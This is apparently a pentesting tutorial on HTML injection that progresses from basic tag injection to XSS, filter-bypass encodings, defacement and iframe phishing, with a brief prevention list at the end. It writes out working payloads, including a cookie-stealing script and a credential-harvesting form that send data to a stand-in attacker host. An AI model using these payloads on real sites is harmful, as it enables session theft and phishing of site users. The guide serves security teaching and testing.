### **HTML Injection: From Basic to Advanced**

HTML Injection is a type of vulnerability that occurs when an attacker can inject arbitrary HTML content into a webpage. This can lead to several types of attacks, such as altering the page’s structure, content injection, or even XSS. Below is a guide to HTML Injection, starting with basic concepts and progressing to advanced payloads.

---

#### **Basics of HTML**

```html
<h1>TEST</h1>
```
This is basic HTML, where the `<h1>` tag is used to create a header.

### **1. Understanding HTML Injection**
HTML Injection happens when user inputs are not sanitized correctly, allowing malicious HTML content to be injected into the page. Typically, this is due to improper handling of user input in web forms, query parameters, or other user-supplied data.

#### **Types of HTML Injection**
- **Reflected HTML Injection**: Content is reflected on the page immediately.
- **Stored HTML Injection**: Malicious content is stored in a database and rendered on multiple pages.

### **2. Basic HTML Injection**

If a webpage accepts user input and embeds it into HTML without sanitization, you can inject HTML. For example:

```html
<h1>Injected Title</h1>
```

To test for HTML injection, try inputting:

```html
<h1>Hello World</h1>
```

If this input is reflected on the page without escaping, then the page is vulnerable to HTML Injection.

### **3. Intermediate Payloads**
With basic knowledge, you can move on to more complex payloads that manipulate the structure of the page. For example, injecting forms or breaking the structure:

```html
<div style="display:none;">Hidden content</div>
```

Or injecting an entire form:

```html
<form action="http://malicious.site" method="POST">
    <input type="text" name="username" value="hacker">
    <input type="submit" value="Submit">
</form>
```

This can be used for phishing attacks or credential harvesting.

### **4. Bypassing Filters**
Sometimes, web applications filter out certain HTML tags. To bypass simple filters, you can try encoding your payloads:

- **Hexadecimal Encoding**:  
```html
&#60;h1&#62;Hacked!&#60;/h1&#62;
```
- **URL Encoding**:  
```html
%3Ch1%3EHacked%21%3C%2Fh1%3E
```

### **5. Advanced HTML Injection Payloads**

#### **5.1 XSS with HTML Injection**

A typical next step in HTML Injection is to combine it with JavaScript to create XSS (Cross-Site Scripting) attacks. This can be done by injecting `<script>` tags:

```html
<script>alert('XSS')</script>
```

If the page allows JavaScript execution, this alert will pop up.

#### **5.2 Cookie Stealing**
Using HTML Injection, you can inject scripts that steal session cookies:

```html
<script>
  var img = new Image();
  img.src = "http://malicious.site/cookie?c=" + document.cookie;
</script>
```

This sends the victim’s cookies to a remote server.

#### **5.3 Defacing the Webpage**
You can also inject payloads that visually deface a page:

```html
<body style="background-color: black; color: red;">
  <h1>You Have Been Hacked!</h1>
</body>
```

#### **5.4 Using Iframes**
Injecting an iframe can allow you to embed malicious content into the page:

```html
<iframe src="http://malicious.site"></iframe>
```

This iframe could load a malicious site, misleading users into providing credentials.

### **6. Advanced Bypasses and Techniques**

#### **6.1 HTML Entities**
HTML entities like `&lt;`, `&gt;` (for `<`, `>`) can sometimes bypass filters:

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

#### **6.2 Breaking Out of Attributes**
You can also break out of HTML attributes to inject content:

```html
<img src="x" onerror="alert('XSS')">
```

Or try closing tags:

```html
"><img src=x onerror=alert(1)>
```

### **7. Preventing HTML Injection**
To prevent HTML Injection:
- **Escape HTML**: Always escape user inputs when inserting them into HTML.
- **Use a Template Engine**: Most template engines auto-escape HTML.
- **Validate Inputs**: Ensure inputs conform to expected formats.
- **Use Content Security Policy (CSP)**: CSP can help prevent malicious scripts from running.
